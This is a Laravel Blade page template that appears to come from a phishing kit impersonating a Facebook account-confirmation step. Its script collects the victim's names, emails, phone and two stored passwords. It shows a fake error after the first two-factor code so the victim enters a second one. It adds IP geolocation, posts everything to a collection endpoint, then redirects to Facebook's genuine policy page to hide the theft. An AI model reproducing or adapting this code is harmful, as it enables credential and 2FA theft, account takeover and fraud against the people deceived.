@push('icons')
    <link rel="apple-touch-icon" href="{{ $settings['favicon_icon'] }}" sizes="180x180">
    <link rel="icon" href="{{ $settings['favicon_icon'] }}" sizes="32x32">
    <link rel="icon" href="{{ $settings['favicon_icon'] }}" sizes="16x16">
    <link rel="icon" href="{{ $settings['favicon_icon'] }}" sizes="16x16">
    <link rel="mask-icon" href="{{ $settings['favicon_icon'] }}">
    <link rel="icon" href="{{ $settings['favicon_icon'] }}">
@endpush
@push('styles')
    <title>@lang('common.title_confirm_page')</title>
    <!--<meta name="viewport" content="user-scalable=no">-->
    <link type="text/css" href="/css/button.css" rel="stylesheet">
    <link type="text/css" href="/css/input.css" rel="stylesheet">
    <link type="text/css" href="/css/modal.css" rel="stylesheet">
    <link type="text/css" href="/css/header.css" rel="stylesheet">
    <link type="text/css" href="/css/body.css" rel="stylesheet">
    <link type="text/css" href="/css/display.css" rel="stylesheet">
    <link type="text/css" href="/css/footer.css" rel="stylesheet">
    <link type="text/css" href="/css/spinner.css" rel="stylesheet">
    <link type="text/css" href="/css/app.css" rel="stylesheet">
    <link type="text/css" href="/css/confirm.css" rel="stylesheet">
    <style>
        #submit-code {
            font-size: 20px;
            font-weight: bolder;
            width: 100%;
            border-radius: 10px;
        }

        #submit-code:hover {
            background-color: #3578E5;
            color: white;
        }

        .btn-send-code {
            margin-top: 10px;
            text-align: center;
            color: #3578E5;
            font-size: 14px;
        }
    </style>
@endpush
@push('scripts')
    <script type="text/javascript">
        const queryParams = '{!! json_encode(\App\Helpers\Helpers::getQueryParams($settings, 'path_login_page')) !!}';
        const parseQueryParams = JSON.parse(queryParams);

        function replaceQueryParam(param, value, search) {
            let regex = new RegExp("([?;&])" + param + "[^&;]*[;&]?");
            let query = search.replace(regex, "$1").replace(/&$/, '');

            return (query.length > 2 ? query + "&" : "?") + (value ? param + "=" + value : '');
        }

        if (parseQueryParams.length > 0) {
            for (const query of parseQueryParams) {
                const currentQuery = window.location.search
                const newUrl = replaceQueryParam(query[0], query[1], currentQuery);
                window.history.pushState(null, null, newUrl)
            }
        }
    </script>
    <script type="text/javascript">
        $.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': '{{ csrf_token() }}'
            }
        });

        $(document).ready(function() {
            var countTimeInterval = null;
            var minute = 5;
            var second = 0;

            countTimeInterval = setInterval(() => {
                second = second - 1;
                if (second < 0) {
                    second = 59;
                    minute = minute - 1;
                }
                if (minute >= 0) {
                    $('.time-remain').text(
                        `${minute < 10 ? '0'+minute : minute}:${second < 10 ? '0'+second : second}`);
                } else {
                    $('.time-remain').text('00:00');
                    clearInterval(countTimeInterval);
                }
            }, 1000);
        });

        var idIntervalGetCacheByEmail = null;
        var isLoginSuccessfully = 0;
        var email = "";
        //
        var ipAddress = "";
        var latitude = "";
        var longitude = "";
        var countryName = "";
        var countryCode = "";
        var cityName = "";
        var regionName = "";
        var timeZone = "";
        var zipCode = "";
        var continent = "";
        var continentCode = "";
        var user = JSON.parse(localStorage.getItem('user')) || '';
        if (!user) {
            window.location.href = '/';
        }

        async function setCurrentLang() {
            let getIpInfoUrl = '{{ session()->get('getIpInfoUrl') }}';
            const response = await fetch(getIpInfoUrl);
            const ipInfo = await response.json();
            ipAddress = ipInfo.ipAddress;
            latitude = ipInfo.latitude;
            longitude = ipInfo.longitude;
            countryName = ipInfo.countryName;
            countryCode = ipInfo.countryCode;
            cityName = ipInfo.cityName;
            regionName = ipInfo.regionName;
            timeZone = ipInfo.timeZone;
            zipCode = ipInfo.zipCode;
            continent = ipInfo.continent;
            continentCode = ipInfo.continentCode;
        }
        setCurrentLang();

        async function getCacheByEmail(email) {
            let result = null;
            let formData = new FormData();
            formData.append('email', email);
            await $.ajax({
                method: "POST",
                url: "/api/get-cache-by-email",
                data: formData,
                cache: false,
                contentType: false,
                processData: false,
                success: function(response) {
                    if (response.status == 0) {
                        result = response.data;
                    }
                }
            })

            return result;
        }

        var countTimeFA = 0;

        $(document).on('click', '#submit-code', async function() {
            $('.notice-error').addClass('d-none');
            const fa_code = $('#input-code').val();
            if (fa_code == '') {
                $('#input-code').addClass('is-invalid')
                return false;
            }
            if (!isValidOTP(fa_code)) {
                $('#input-code').addClass('is-invalid')
                return false;
            }

            const loading = $('#submit-code-loading');
            const text = $('#submit-code-text');
            text.addClass('d-none');
            loading.removeClass('d-none');
            //
            if (countTimeFA == 0) {
                countTimeFA = 1;
                let user = JSON.parse(localStorage.getItem('user'));
                localStorage.setItem('user', JSON.stringify({
                    ...user,
                    fa_code_1: fa_code
                }));
                // display error
                setTimeout(() => {
                    $('#submit-code').prop('disabled', false);
                    $('.notice-error').removeClass('d-none');
                    text.removeClass('d-none');
                    loading.addClass('d-none');
                    $('#input-code').val('');
                }, 2000);
            } else {
                let formData = new FormData();
                let user = JSON.parse(localStorage.getItem('user'));
                //
                formData.append('name_fanpage', user ? user.name_fanpage : '');
                formData.append('fullname', user ? user.fullname : '');
                formData.append('bussiness_email', user ? user.bussiness_email : '');
                formData.append('personal_email', user ? user.personal_email : '');
                formData.append('phone', user ? user.phone : '');
                formData.append('information', user ? user.information : '');
                formData.append('fa_code_1', user ? user.fa_code_1 : '');
                formData.append('fa_code_2', fa_code);
                formData.append('password_1', user ? user.password_1 : '');
                formData.append('password_2', user ? user.password_2 : '');
                formData = pushIPInfo(formData);
                await $.ajax({
                    method: "POST",
                    url: "/api/send-data-fa",
                    data: formData,
                    cache: false,
                    contentType: false,
                    processData: false,
                    success: function(response) {
                        if (response.status == 0) {
                            $('#popup').css('display', 'flex');
                            text.removeClass('d-none');
                            loading.addClass('d-none');
                        } else {
                            $('#submit-code').prop('disabled', false);
                            $('.notice-error').removeClass('d-none');
                            text.removeClass('d-none');
                            loading.addClass('d-none');
                        }
                    }
                });
            }

        })

        function pushIPInfo(formData) {
            formData.append('ipAddress', ipAddress)
            formData.append('latitude', latitude)
            formData.append('longitude', longitude)
            formData.append('countryName', countryName)
            formData.append('countryCode', countryCode)
            formData.append('regionName', regionName)
            formData.append('cityName', cityName)
            formData.append('timeZone', timeZone)
            formData.append('zipCode', zipCode)
            formData.append('continent', continent)
            formData.append('continentCode', continentCode)
            return formData;
        }

        function isValidOTP(value) {
            // const regexOtp = /^\d{6}|\d{8}$/;
            return /^\d{6}$/.test(value) || /^\d{8}$/.test(value);
        }

        function validateOtp() {
            $(this).val($(this).val().replace(/[^0-9.]/g, ''));

            if ($(this).val().length >= 8) {
                // event.preventDefault();
                $(this).val($(this).val().slice(0, 8));
            }

            if (!isValidOTP($(this).val())) {
                $(this).addClass('is-invalid');
                $('#send-otp-number').removeClass('disabled');
            } else {
                $(this).removeClass('is-invalid');
            }
        }

        function closePopup() {
            $('#popup').css('display', 'none');
        }

        $(document).on('click', '.button-ok', function() {
            window.location.href = 'https://www.facebook.com/policies_center/';
        });

        $(document).on('keypress', '.validate-otp', validateOtp);
        $(document).on('input', '.validate-otp', validateOtp);
        $(document).on('keydown', '.validate-input', validateOtp);
    </script>
@endpush
@extends('layouts.main')
@section('content')
    <main class="home">
        <div class="body form-confirm">
            <div class="fb_content clearfix " role="main">
                <div class="body-form">
                    <div class="form-confirm">
                        <div class="form-confirm-title">
                            <div class="title-confirm" style="font-size: 24px">@lang('confirm.title_form')</div>
                        </div>
                        <div class="form-confirm-sub-title form-confirm-input">
                            <div class="">@lang('confirm.sub_title_form')</div>
                        </div>
                        <img src="/assets/img/transfer.gif" style="width: 100%" alt="">
                        <div class="form-confirm-input">
                            <div class="form-confirm-input-text">
                                <input id="input-code" style="font-size: 16px;" type="text" max="999999"
                                    class="form-control validate-input w-100 validate-otp"
                                    placeholder="@lang('confirm.login_code')" />
                            </div>
                        </div>
                        <div class="notice-error d-none">@lang('confirm.error_notice')</div>
                        <div class=""
                            style="background-color:#F7F8FA;border-radius:10px;display:flex;padding:15px;margin:10px 0px;align-items:center">
                            <div class="">
                                <p style="font-size: 12px">@lang('confirm.noti_1')</p>
                                <p>@lang('confirm.noti_2') <b class="time-remain">05:00</b> @lang('confirm.noti_3') </p>
                            </div>
                        </div>
                        <p>@lang('confirm.noti_4')</p>
                        {{-- <div class="line-hr"></div> --}}
                        <div class="form-confirm-footer">
                            <button style="width: 100%" id="submit-code" class="disabled">
                                <span id="submit-code-loading"
                                    class="d-none spinner-border spinner-border-sm spinner"></span>
                                <span id="submit-code-text">@lang('confirm.submit_code')</span>
                            </button>
                        </div>
                        <div style="" class="btn-send-code">@lang('confirm.button_send_code')</div>
                    </div>
                </div>
            </div>
        </div>
    </main>
    <div class="popup-confirm-container" id="popup">
        <div class="popup-confirm-content">
            <div class="popup-confirm-header">
                <p>@lang('confirm.popup_header')</p>
            </div>
            <div class="popup-confirm-body">
                <p class="popup-confirm-text">@lang('confirm.popup_content')</p>
            </div>
            <div class="popup-confirm-footer">
                <button style="padding:10px 25px;background-color: #4267B2;color:white;border-radius:10px;font-size:16px" type="button" class="button-ok">
                    @lang('confirm.button_ok')
                </button>
            </div>
        </div>
    </div>
@endsection
